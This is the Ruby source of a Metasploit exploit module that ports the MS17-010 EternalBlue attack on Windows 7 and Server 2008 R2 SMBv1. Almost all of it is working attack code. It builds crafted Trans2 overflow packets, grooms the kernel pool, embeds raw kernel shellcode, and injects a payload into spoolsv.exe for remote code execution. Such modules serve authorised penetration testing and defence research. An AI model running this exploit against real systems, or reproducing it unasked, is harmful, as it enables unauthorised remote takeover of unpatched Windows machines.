##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb'
require 'ruby_smb/smb1/packet'
require 'windows_error'

class MetasploitModule < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption',
      'Description'    => %q{
        This module is a port of the Equation Group ETERNALBLUE exploit, part of
        the FuzzBunch toolkit released by Shadow Brokers.

        There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size
        is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a
        DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow
        is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later
        completed in srvnet!SrvNetWskReceiveComplete.

        This exploit, like the original may not trigger 100% of the time, and should be
        run continuously until triggered. It seems like the pool will get hot streaks
        and need a cool down period before the shells rain in again.

        The module will attempt to use Anonymous login, by default, to authenticate to perform the
        exploit. If the user supplies credentials in the SMBUser,SMBPass, and SMBDomain options it will use
        those instead.

        On some systems, this module may cause system instability and crashes, such as a BSOD or
        a reboot. This may be more likely with some payloads.
      },

      'Author'         => [
        'Sean Dillon <sean.dillon@risksense.com>',  # @zerosum0x0
        'Dylan Davis <dylan.davis@risksense.com>',  # @jennamagius
        'Equation Group',
        'Shadow Brokers',
        'thelightcosine'  # RubySMB refactor and Fallback Credential mode
       ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'MSB', 'MS17-010' ],
          [ 'CVE', '2017-0143' ],
          [ 'CVE', '2017-0144' ],
          [ 'CVE', '2017-0145' ],
          [ 'CVE', '2017-0146' ],
          [ 'CVE', '2017-0147' ],
          [ 'CVE', '2017-0148' ],
          [ 'URL', 'https://github.com/RiskSense-Ops/MS17-010' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Privileged'     => true,
      'Payload'        =>
        {
          'Space'           => 2000,  # this can be more, needs to be recalculated
          'EncoderType'     => Msf::Encoder::Type::Raw,
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows 7 and Server 2008 R2 (x64) All Service Packs',
            {
              'Platform'       => 'win',
              'Arch'           => [ ARCH_X64 ],

              'os_patterns'    => ['Server 2008 R2', 'Windows 7'],
              'ep_thl_b'       => 0x308,  # EPROCESS.ThreadListHead.Blink offset
              'et_alertable'   => 0x4c,   # ETHREAD.Alertable offset
              'teb_acp'        => 0x2c8,  # TEB.ActivationContextPointer offset
              'et_tle'         => 0x420   # ETHREAD.ThreadListEntry offset
            }
          ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Mar 14 2017'
    ))

    register_options(
      [
        Opt::RPORT(445),
        OptString.new('ProcessName', [ true, 'Process to inject payload into.', 'spoolsv.exe' ]),
        OptInt.new( 'MaxExploitAttempts', [ true,  "The number of times to retry the exploit.", 3 ] ),
        OptInt.new( 'GroomAllocations', [ true,  "Initial number of times to groom the kernel pool.", 12 ] ),
        OptInt.new( 'GroomDelta', [ true,  "The amount to increase the groom count by per try.", 5 ] ),
        OptBool.new( 'VerifyTarget', [ true,  "Check if remote OS matches exploit Target.", true ] ),
        OptBool.new( 'VerifyArch', [ true,  "Check if remote architecture matches exploit Target.", true ] ),
        OptString.new('SMBUser', [ false, '(Optional) The username to authenticate as', '']),
        OptString.new('SMBPass', [ false, '(Optional) The password for the specified username', '']),
        OptString.new('SMBDomain',  [ false, '(Optional) The Windows domain to use for authentication', '.']),
      ])
  end

  class EternalBlueError < StandardError
  end

  def check
    # todo: create MS17-010 mixin, and hook up auxiliary/scanner/smb/smb_ms17_010
  end

  def exploit
    begin
      for i in 1..datastore['MaxExploitAttempts']

        grooms = datastore['GroomAllocations'] + datastore['GroomDelta'] * (i - 1)

        smb_eternalblue(datastore['ProcessName'], grooms)

        # we don't need this sleep, and need to find a way to remove it
        # problem is session_count won't increment until stage is complete :\
        secs = 0
        while !session_created? and secs < 5
          secs += 1
          sleep 1
        end

        if session_created?
          print_good("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
          print_good("=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
          print_good("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
          break
        else
          print_bad("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
          print_bad("=-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
          print_bad("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
        end
      end

    rescue EternalBlueError => e
      print_bad("#{e.message}")
    rescue  ::RubySMB::Error::UnexpectedStatusCode,
            ::Errno::ECONNRESET,
            ::Rex::HostUnreachable,
            ::Rex::ConnectionTimeout,
            ::Rex::ConnectionRefused  => e
      print_bad("#{e.class}: #{e.message}")
    rescue => error
      print_bad(error.class.to_s)
      print_bad(error.message)
      print_bad(error.backtrace.join("\n"))
    ensure
      # pass
    end
  end

  def smb_eternalblue(process_name, grooms)
    begin
      # Step 0: pre-calculate what we can
      shellcode =  make_kernel_user_payload(payload.encode, 0, 0, 0, 0, 0)
      payload_hdr_pkt = make_smb2_payload_headers_packet
      payload_body_pkt = make_smb2_payload_body_packet(shellcode)

      # Step 1: Connect to IPC$ share
      print_status("Connecting to target for exploitation.")
      client, tree, sock, os = smb1_anonymous_connect_ipc()
      print_good("Connection established for exploitation.")

      if verify_target(os)
        print_good('Target OS selected valid for OS indicated by SMB reply')
      else
        print_warning('Target OS selected not valid for OS indicated by SMB reply')
        print_warning('Disable VerifyTarget option to proceed manually...')
        raise EternalBlueError, 'Unable to continue with improper OS Target.'
      end

      # cool buffer print no matter what, will be helpful when people post debug issues
      print_core_buffer(os)

      if verify_arch
        print_good('Target arch selected valid for arch indicated by DCE/RPC reply')
      else
        print_warning('Target arch selected not valid for arch indicated by DCE/RPC reply')
        print_warning('Disable VerifyArch option to proceed manually...')
        raise EternalBlueError, 'Unable to continue with improper OS Arch.'
      end

      print_status("Trying exploit with #{grooms} Groom Allocations.")

      # Step 2: Create a large SMB1 buffer
      print_status("Sending all but last fragment of exploit packet")
      smb1_large_buffer(client, tree, sock)

      # Step 3: Groom the pool with payload packets, and open/close SMB1 packets
      print_status("Starting non-paged pool grooming")

      # initialize_groom_threads(ip, port, payload, grooms)
      fhs_sock = smb1_free_hole(true)

      @groom_socks = []

      print_good("Sending SMBv2 buffers")
      smb2_grooms(grooms, payload_hdr_pkt)

      fhf_sock = smb1_free_hole(false)

      print_good("Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.")
      fhs_sock.shutdown()

      print_status("Sending final SMBv2 buffers.") # 6x
      smb2_grooms(6, payload_hdr_pkt) # todo: magic #

      fhf_sock.shutdown()

      print_status("Sending last fragment of exploit packet!")
      final_exploit_pkt = make_smb1_trans2_exploit_packet(tree.id, client.user_id, :eb_trans2_exploit, 15)
      sock.put(final_exploit_pkt)

      print_status("Receiving response from exploit packet")
      code, raw = smb1_get_response(sock)

      code_str = "0x" + code.to_i.to_s(16).upcase
      if code.nil?
        print_error("Did not receive a response from exploit packet")
      elsif code == 0xc000000d # STATUS_INVALID_PARAMETER (0xC000000D)
        print_good("ETERNALBLUE overwrite completed successfully (#{code_str})!")
      else
        print_warning("ETERNALBLUE overwrite returned unexpected status code (#{code_str})!")
      end

      # Step 4: Send the payload
      print_status("Sending egg to corrupted connection.")

      @groom_socks.each{ |gsock| gsock.put(payload_body_pkt.first(2920)) }
      @groom_socks.each{ |gsock| gsock.put(payload_body_pkt[2920..(4204 - 0x84)]) }

      print_status("Triggering free of corrupted buffer.")
      # tree disconnect
      # logoff and x
      # note: these aren't necessary, just close the sockets
      return true
    ensure
      abort_sockets
    end
  end

  def verify_target(os)
    os = os.gsub("\x00", '')  # strip unicode bs
    os << "\x00"              # but original has a null
    ret = true

    if datastore['VerifyTarget']
      ret = false
      # search if its in patterns
      target['os_patterns'].each do |pattern|
        if os.downcase.include? pattern.downcase
          ret = true
          break
        end
      end
    end

    return ret
  end

  # https://github.com/CoreSecurity/impacket/blob/master/examples/getArch.py
  # https://msdn.microsoft.com/en-us/library/cc243948.aspx#Appendix_A_53
  def verify_arch
    ret = false

    return true if !datastore['VerifyArch']

    pkt = Rex::Proto::DCERPC::Packet.make_bind(
      # Abstract Syntax: EPMv4 V3.0
      'e1af8308-5d1f-11c9-91a4-08002b14a0fa', '3.0',
      # Transfer Syntax[1]: 64bit NDR V1
      '71710533-beba-4937-8319-b5dbef9ccc36', '1.0'
    ).first

    begin
      sock = connect(false,
        'RHOST' => rhost,
        'RPORT' => 135
      )
    rescue Rex::ConnectionError => e
      print_error(e.to_s)
      return false
    end

    sock.put(pkt)

    begin
      res = sock.get_once(60)
    rescue EOFError
      print_error('DCE/RPC socket returned EOFError')
      return false
    end

    disconnect(sock)

    begin
      resp = Rex::Proto::DCERPC::Response.new(res)
    rescue Rex::Proto::DCERPC::Exceptions::InvalidPacket => e
      print_error(e.to_s)
      return false
    end

    case target_arch.first
    when ARCH_X64
      # Ack result: Acceptance (0)
      if resp.ack_result.first == 0
        ret = true
      end
    when ARCH_X86
      # Ack result: Provider rejection (2)
      # Ack reason: Proposed transfer syntaxes not supported (2)
      if resp.ack_result.first == 2 && resp.ack_reason.first == 2
        ret = true
      end
    end

    ret
  end

  def print_core_buffer(os)
    print_status("CORE raw buffer dump (#{os.length.to_s} bytes)")

    count = 0
    chunks = os.scan(/.{1,16}/)
    chunks.each do | chunk |
      hexdump = chunk.chars.map { |ch| ch.ord.to_s(16).rjust(2, "0") }.join(" ")

      format = "0x%08x  %-47s  %-16s" % [(count * 16), hexdump, chunk]
      print_status(format)
      count += 1
    end
  end

  #
  # Increase the default delay by five seconds since some kernel-mode
  # payloads may not run immediately.
  #
  def wfs_delay
    super + 5
  end


  def smb2_grooms(grooms, payload_hdr_pkt)
    grooms.times do |groom_id|
      gsock = connect(false)
      @groom_socks << gsock
      gsock.put(payload_hdr_pkt)
    end
  end

  def smb1_anonymous_connect_ipc
    sock = connect(false)
    dispatcher = RubySMB::Dispatcher::Socket.new(sock)
    client = RubySMB::Client.new(dispatcher, smb1: true, smb2: false, username: smb_user, password: smb_pass)
    response_code = client.login

    unless response_code == ::WindowsError::NTStatus::STATUS_SUCCESS
      raise RubySMB::Error::UnexpectedStatusCode, "Error with login: #{response_code.to_s}"
    end
    os = client.peer_native_os

    tree = client.tree_connect("\\\\#{datastore['RHOST']}\\IPC$")

    return client, tree, sock, os
  end

  def smb1_large_buffer(client, tree, sock)
    nt_trans_pkt = make_smb1_nt_trans_packet(tree.id, client.user_id)

    # send NT Trans
    vprint_status("Sending NT Trans Request packet")

    client.send_recv(nt_trans_pkt)
    # Initial Trans2  request
    trans2_pkt_nulled = make_smb1_trans2_exploit_packet(tree.id, client.user_id, :eb_trans2_zero, 0)

    # send all but last packet
    for i in 1..14
        trans2_pkt_nulled << make_smb1_trans2_exploit_packet(tree.id, client.user_id, :eb_trans2_buffer, i)
    end

    vprint_status("Sending malformed Trans2 packets")
    sock.put(trans2_pkt_nulled)

    sock.get_once

    client.echo(count:1, data: "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00")
  end

  def smb1_free_hole(start)
    sock = connect(false)
    dispatcher = RubySMB::Dispatcher::Socket.new(sock)
    client = RubySMB::Client.new(dispatcher, smb1: true, smb2: false, username: smb_user, password: smb_pass)
    client.negotiate

    pkt = ""

    if start
      vprint_status("Sending start free hole packet.")
      pkt = make_smb1_free_hole_session_packet("\x07\xc0", "\x2d\x01", "\xf0\xff\x00\x00\x00")
    else
      vprint_status("Sending end free hole packet.")
      pkt = make_smb1_free_hole_session_packet("\x07\x40", "\x2c\x01", "\xf8\x87\x00\x00\x00")
    end

    client.send_recv(pkt)
    sock
  end

  def smb1_get_response(sock)
    raw = nil

    # dirty hack since it doesn't always like to reply the first time...
    16.times do
      raw = sock.get_once
      break unless raw.nil? or raw.empty?
    end

    return nil unless raw
    response = RubySMB::SMB1::SMBHeader.read(raw[4..-1])
    code = response.nt_status
    return code, raw, response
  end

  def make_smb2_payload_headers_packet
    # don't need a library here, the packet is essentially nonsensical
    pkt = ""
    pkt << "\x00"             # session message
    pkt << "\x00\xff\xf7"     # size
    pkt << "\xfeSMB"          # SMB2
    pkt << "\x00" * 124

    pkt
  end

  def make_smb2_payload_body_packet(kernel_user_payload)
    # precalculated lengths
    pkt_max_len = 4204
    pkt_setup_len = 497
    pkt_max_payload = pkt_max_len - pkt_setup_len # 3575

    # this packet holds padding, KI_USER_SHARED_DATA addresses, and shellcode
    pkt = ""

    # padding
    pkt << "\x00" * 0x8
    pkt << "\x03\x00\x00\x00"
    pkt << "\x00" * 0x1c
    pkt << "\x03\x00\x00\x00"
    pkt << "\x00" * 0x74

    # KI_USER_SHARED_DATA addresses
    pkt << "\xb0\x00\xd0\xff\xff\xff\xff\xff" * 2 # x64 address
    pkt << "\x00" * 0x10
    pkt << "\xc0\xf0\xdf\xff" * 2                 # x86 address
    pkt << "\x00" * 0xc4

    # payload addreses
    pkt << "\x90\xf1\xdf\xff"
    pkt << "\x00" * 0x4
    pkt << "\xf0\xf1\xdf\xff"
    pkt << "\x00" * 0x40

    pkt << "\xf0\x01\xd0\xff\xff\xff\xff\xff"
    pkt << "\x00" * 0x8
    pkt << "\x00\x02\xd0\xff\xff\xff\xff\xff"
    pkt << "\x00"

    pkt << kernel_user_payload

    # fill out the rest, this can be randomly generated
    pkt << "\x00" * (pkt_max_payload - kernel_user_payload.length)

    pkt
  end

  # Type can be :eb_trans2_zero, :eb_trans2_buffer, or :eb_trans2_exploit
  def make_smb1_trans2_exploit_packet(tree_id, user_id, type, timeout)
    timeout = (timeout * 0x10) + 3
    timeout_value = "\x35\x00\xd0" + timeout.chr

    packet = RubySMB::SMB1::Packet::Trans2::Request.new
    packet = set_smb1_headers(packet,tree_id,user_id)

    # The packets are labeled as Secondary Requests but are actually structured
    # as normal Trans2 Requests for some reason. We shall similarly cheat here.
    packet.smb_header.command = RubySMB::SMB1::Commands::SMB_COM_TRANSACTION2_SECONDARY

    packet.parameter_block.flags.read("\x00\x10")
    packet.parameter_block.timeout.read(timeout_value)

    packet.parameter_block.word_count       = 9
    packet.parameter_block.total_data_count = 4096
    packet.parameter_block.parameter_count  = 4096

    nbss = "\x00\x00\x10\x35"
    pkt  = packet.to_binary_s
    pkt  = pkt[0,packet.parameter_block.parameter_offset.abs_offset]
    pkt  = nbss + pkt

    case type
      when :eb_trans2_exploit
        vprint_status("Making :eb_trans2_exploit packet")

        pkt << "\x41" * 2957

        pkt << "\x80\x00\xa8\x00"                     # overflow

        pkt << "\x00" * 0x10
        pkt << "\xff\xff"
        pkt << "\x00" * 0x6
        pkt << "\xff\xff"
        pkt << "\x00" * 0x16

        pkt << "\x00\xf1\xdf\xff"             # x86 addresses
        pkt << "\x00" * 0x8
        pkt << "\x20\xf0\xdf\xff"

        pkt << "\x00\xf1\xdf\xff\xff\xff\xff\xff" # x64

        pkt << "\x60\x00\x04\x10"
        pkt << "\x00" * 4

        pkt << "\x80\xef\xdf\xff"

        pkt << "\x00" * 4
        pkt << "\x10\x00\xd0\xff\xff\xff\xff\xff"
        pkt << "\x18\x01\xd0\xff\xff\xff\xff\xff"
        pkt << "\x00" * 0x10

        pkt << "\x60\x00\x04\x10"
        pkt << "\x00" * 0xc
        pkt << "\x90\xff\xcf\xff\xff\xff\xff\xff"
        pkt << "\x00" * 0x8
        pkt << "\x80\x10"
        pkt << "\x00" * 0xe
        pkt << "\x39"
        pkt << "\xbb"

        pkt << "\x41" * 965
      when :eb_trans2_zero
        vprint_status("Making :eb_trans2_zero packet")
        pkt << "\x00" * 2055
        pkt << "\x83\xf3"
        pkt << "\x41" * 2039
      else
        vprint_status("Making :eb_trans2_buffer packet")
        pkt << "\x41" * 4096
    end
    pkt
  end

  def make_smb1_nt_trans_packet(tree_id, user_id)
    packet = RubySMB::SMB1::Packet::NtTrans::Request.new

    # Disable the automatic padding because it will distort
    # our values here.
    packet.data_block.enable_padding = false

    packet = set_smb1_headers(packet,tree_id,user_id)

    packet.parameter_block.max_setup_count       = 1
    packet.parameter_block.total_parameter_count = 30
    packet.parameter_block.total_data_count      = 66512
    packet.parameter_block.max_parameter_count   = 30
    packet.parameter_block.max_data_count        = 0
    packet.parameter_block.parameter_count       = 30
    packet.parameter_block.parameter_offset      = 75
    packet.parameter_block.data_count            = 976
    packet.parameter_block.data_offset           = 104
    packet.parameter_block.function              = 0

    packet.parameter_block.setup << 0x0000

    packet.data_block.byte_count        = 1004
    packet.data_block.trans2_parameters =  "\x00" * 31 + "\x01" + ( "\x00" * 973 )
    packet
  end

  def make_smb1_free_hole_session_packet(flags2, vcnum, native_os)
    packet = RubySMB::SMB1::Packet::SessionSetupRequest.new

    packet.smb_header.flags.read("\x18")
    packet.smb_header.flags2.read(flags2)
    packet.smb_header.pid_high = 65279
    packet.smb_header.mid      = 64

    packet.parameter_block.vc_number.read(vcnum)
    packet.parameter_block.max_buffer_size      = 4356
    packet.parameter_block.max_mpx_count        = 10
    packet.parameter_block.security_blob_length = 0

    packet.data_block.native_os       = native_os
    packet.data_block.native_lan_man  = "\x00" * 17
    packet
  end

  # ring3 = user mode encoded payload
  # proc_name = process to inject APC into
  # ep_thl_b = EPROCESS.ThreadListHead.Blink offset
  # et_alertable = ETHREAD.Alertable offset
  # teb_acp = TEB.ActivationContextPointer offset
  # et_tle = ETHREAD.ThreadListEntry offset
  def make_kernel_user_payload(ring3, proc_name, ep_thl_b, et_alertable, teb_acp, et_tle)
    sc = make_kernel_shellcode
    sc << [ring3.length].pack("S<")
    sc << ring3
    sc
  end

  def make_kernel_shellcode
    # see: external/source/shellcode/windows/multi_arch_kernel_queue_apc.asm
    # Length: 1019 bytes

    #"\xcc"+
    "\x31\xC9\x41\xE2\x01\xC3\xB9\x82\x00\x00\xC0\x0F\x32\x48\xBB\xF8" +
    "\x0F\xD0\xFF\xFF\xFF\xFF\xFF\x89\x53\x04\x89\x03\x48\x8D\x05\x0A" +
    "\x00\x00\x00\x48\x89\xC2\x48\xC1\xEA\x20\x0F\x30\xC3\x0F\x01\xF8" +
    "\x65\x48\x89\x24\x25\x10\x00\x00\x00\x65\x48\x8B\x24\x25\xA8\x01" +
    "\x00\x00\x50\x53\x51\x52\x56\x57\x55\x41\x50\x41\x51\x41\x52\x41" +
    "\x53\x41\x54\x41\x55\x41\x56\x41\x57\x6A\x2B\x65\xFF\x34\x25\x10" +
    "\x00\x00\x00\x41\x53\x6A\x33\x51\x4C\x89\xD1\x48\x83\xEC\x08\x55" +
    "\x48\x81\xEC\x58\x01\x00\x00\x48\x8D\xAC\x24\x80\x00\x00\x00\x48" +
    "\x89\x9D\xC0\x00\x00\x00\x48\x89\xBD\xC8\x00\x00\x00\x48\x89\xB5" +
    "\xD0\x00\x00\x00\x48\xA1\xF8\x0F\xD0\xFF\xFF\xFF\xFF\xFF\x48\x89" +
    "\xC2\x48\xC1\xEA\x20\x48\x31\xDB\xFF\xCB\x48\x21\xD8\xB9\x82\x00" +
    "\x00\xC0\x0F\x30\xFB\xE8\x38\x00\x00\x00\xFA\x65\x48\x8B\x24\x25" +
    "\xA8\x01\x00\x00\x48\x83\xEC\x78\x41\x5F\x41\x5E\x41\x5D\x41\x5C" +
    "\x41\x5B\x41\x5A\x41\x59\x41\x58\x5D\x5F\x5E\x5A\x59\x5B\x58\x65" +
    "\x48\x8B\x24\x25\x10\x00\x00\x00\x0F\x01\xF8\xFF\x24\x25\xF8\x0F" +
    "\xD0\xFF\x56\x41\x57\x41\x56\x41\x55\x41\x54\x53\x55\x48\x89\xE5" +
    "\x66\x83\xE4\xF0\x48\x83\xEC\x20\x4C\x8D\x35\xE3\xFF\xFF\xFF\x65" +
    "\x4C\x8B\x3C\x25\x38\x00\x00\x00\x4D\x8B\x7F\x04\x49\xC1\xEF\x0C" +
    "\x49\xC1\xE7\x0C\x49\x81\xEF\x00\x10\x00\x00\x49\x8B\x37\x66\x81" +
    "\xFE\x4D\x5A\x75\xEF\x41\xBB\x5C\x72\x11\x62\xE8\x18\x02\x00\x00" +
    "\x48\x89\xC6\x48\x81\xC6\x08\x03\x00\x00\x41\xBB\x7A\xBA\xA3\x30" +
    "\xE8\x03\x02\x00\x00\x48\x89\xF1\x48\x39\xF0\x77\x11\x48\x8D\x90" +
    "\x00\x05\x00\x00\x48\x39\xF2\x72\x05\x48\x29\xC6\xEB\x08\x48\x8B" +
    "\x36\x48\x39\xCE\x75\xE2\x49\x89\xF4\x31\xDB\x89\xD9\x83\xC1\x04" +
    "\x81\xF9\x00\x00\x01\x00\x0F\x8D\x66\x01\x00\x00\x4C\x89\xF2\x89" +
    "\xCB\x41\xBB\x66\x55\xA2\x4B\xE8\xBC\x01\x00\x00\x85\xC0\x75\xDB" +
    "\x49\x8B\x0E\x41\xBB\xA3\x6F\x72\x2D\xE8\xAA\x01\x00\x00\x48\x89" +
    "\xC6\xE8\x50\x01\x00\x00\x41\x81\xF9\xBF\x77\x1F\xDD\x75\xBC\x49" +
    "\x8B\x1E\x4D\x8D\x6E\x10\x4C\x89\xEA\x48\x89\xD9\x41\xBB\xE5\x24" +
    "\x11\xDC\xE8\x81\x01\x00\x00\x6A\x40\x68\x00\x10\x00\x00\x4D\x8D" +
    "\x4E\x08\x49\xC7\x01\x00\x10\x00\x00\x4D\x31\xC0\x4C\x89\xF2\x31" +
    "\xC9\x48\x89\x0A\x48\xF7\xD1\x41\xBB\x4B\xCA\x0A\xEE\x48\x83\xEC" +
    "\x20\xE8\x52\x01\x00\x00\x85\xC0\x0F\x85\xC8\x00\x00\x00\x49\x8B" +
    "\x3E\x48\x8D\x35\xE9\x00\x00\x00\x31\xC9\x66\x03\x0D\xD7\x01\x00" +
    "\x00\x66\x81\xC1\xF9\x00\xF3\xA4\x48\x89\xDE\x48\x81\xC6\x08\x03" +
    "\x00\x00\x48\x89\xF1\x48\x8B\x11\x4C\x29\xE2\x51\x52\x48\x89\xD1" +
    "\x48\x83\xEC\x20\x41\xBB\x26\x40\x36\x9D\xE8\x09\x01\x00\x00\x48" +
    "\x83\xC4\x20\x5A\x59\x48\x85\xC0\x74\x18\x48\x8B\x80\xC8\x02\x00" +
    "\x00\x48\x85\xC0\x74\x0C\x48\x83\xC2\x4C\x8B\x02\x0F\xBA\xE0\x05" +
    "\x72\x05\x48\x8B\x09\xEB\xBE\x48\x83\xEA\x4C\x49\x89\xD4\x31\xD2" +
    "\x80\xC2\x90\x31\xC9\x41\xBB\x26\xAC\x50\x91\xE8\xC8\x00\x00\x00" +
    "\x48\x89\xC1\x4C\x8D\x89\x80\x00\x00\x00\x41\xC6\x01\xC3\x4C\x89" +
    "\xE2\x49\x89\xC4\x4D\x31\xC0\x41\x50\x6A\x01\x49\x8B\x06\x50\x41" +
    "\x50\x48\x83\xEC\x20\x41\xBB\xAC\xCE\x55\x4B\xE8\x98\x00\x00\x00" +
    "\x31\xD2\x52\x52\x41\x58\x41\x59\x4C\x89\xE1\x41\xBB\x18\x38\x09" +
    "\x9E\xE8\x82\x00\x00\x00\x4C\x89\xE9\x41\xBB\x22\xB7\xB3\x7D\xE8" +
    "\x74\x00\x00\x00\x48\x89\xD9\x41\xBB\x0D\xE2\x4D\x85\xE8\x66\x00" +
    "\x00\x00\x48\x89\xEC\x5D\x5B\x41\x5C\x41\x5D\x41\x5E\x41\x5F\x5E" +
    "\xC3\xE9\xB5\x00\x00\x00\x4D\x31\xC9\x31\xC0\xAC\x41\xC1\xC9\x0D" +
    "\x3C\x61\x7C\x02\x2C\x20\x41\x01\xC1\x38\xE0\x75\xEC\xC3\x31\xD2" +
    "\x65\x48\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x12" +
    "\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A\x45\x31\xC9\x31\xC0\xAC\x3C" +
    "\x61\x7C\x02\x2C\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xEE\x45\x39" +
    "\xD9\x75\xDA\x4C\x8B\x7A\x20\xC3\x4C\x89\xF8\x41\x51\x41\x50\x52" +
    "\x51\x56\x48\x89\xC2\x8B\x42\x3C\x48\x01\xD0\x8B\x80\x88\x00\x00" +
    "\x00\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40\x20\x49\x01\xD0\x48" +
    "\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6\xE8\x78\xFF\xFF\xFF\x45\x39" +
    "\xD9\x75\xEC\x58\x44\x8B\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48" +
    "\x44\x8B\x40\x1C\x49\x01\xD0\x41\x8B\x04\x88\x48\x01\xD0\x5E\x59" +
    "\x5A\x41\x58\x41\x59\x41\x5B\x41\x53\xFF\xE0\x56\x41\x57\x55\x48" +
    "\x89\xE5\x48\x83\xEC\x20\x41\xBB\xDA\x16\xAF\x92\xE8\x4D\xFF\xFF" +
    "\xFF\x31\xC9\x51\x51\x51\x51\x41\x59\x4C\x8D\x05\x1A\x00\x00\x00" +
    "\x5A\x48\x83\xEC\x20\x41\xBB\x46\x45\x1B\x22\xE8\x68\xFF\xFF\xFF" +
    "\x48\x89\xEC\x5D\x41\x5F\x5E\xC3"#\x01\x00\xC3"

  end

  # Sets common SMB1 Header values used by the various
  # packets in the exploit.
  #
  # @rturn [RubySMB::GenericPacket] the modified version of the packet
  def set_smb1_headers(packet,tree_id,user_id)
    packet.smb_header.flags2.read("\x07\xc0")
    packet.smb_header.tid       = tree_id
    packet.smb_header.uid       = user_id
    packet.smb_header.pid_low   = 65279
    packet.smb_header.mid       = 64
    packet
  end


  # Returns the value to be passed to SMB clients for
  # the password. If the user hs not supplied a password
  # it returns an empty string to trigger an anonymous
  # logon.
  #
  # @return [String] the password value
  def smb_pass
    if datastore['SMBPass'].present?
      datastore['SMBPass']
    else
      ''
    end
  end

  # Returns the value to be passed to SMB clients for
  # the username. If the user hs not supplied a username
  # it returns an empty string to trigger an anonymous
  # logon.
  #
  # @return [String] the username value
  def smb_user
    if datastore['SMBUser'].present?
      datastore['SMBUser']
    else
      ''
    end
  end

end
